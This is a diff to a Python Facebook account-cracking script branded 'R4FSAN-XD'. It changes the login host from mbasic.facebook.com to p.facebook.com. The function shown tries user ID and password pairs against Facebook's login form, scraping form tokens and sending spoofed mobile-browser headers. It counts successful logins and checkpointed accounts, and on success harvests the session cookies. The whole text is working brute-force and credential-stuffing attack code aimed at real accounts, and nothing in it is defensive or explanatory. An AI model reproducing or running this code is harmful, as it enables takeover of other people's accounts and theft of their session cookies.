@@ -220,7 +220,7 @@ def rcrack1(uid,pwx,tl):
             session = requests.Session()
             sys.stdout.write('\r[\033[1;92mR4FSAN-XD\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://p.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -231,10 +231,10 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
-            "method": 'GET',
+            header_freefb = {'authority': 'p.facebook.com',
+            "method": 'page',
             "scheme": 'https',
-            'authority': 'mbasic.facebook.com',
+            'authority': 'p.facebook.com',
             'x-fb-rlafr': '0',
             'access-control-allow-origin': '*',
             'facebook-api-version': 'v16.0',
@@ -257,7 +257,7 @@ def rcrack1(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A530F/A530FXXS8CSL2 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.0 Chrome/59.0.3071.125 Mobile Safari/537.36',}
-            lo = session.post('https://mbasic.facebook.com/login/?li=nigVZLNWTZ3wDwKBvqdp5NLE&e=1348029&shbl=1&ref=dbl&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
+            lo = session.post('https://p.facebook.com/login/?li=nigVZLNWTZ3wDwKBvqdp5NLE&e=1348029&shbl=1&ref=dbl&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
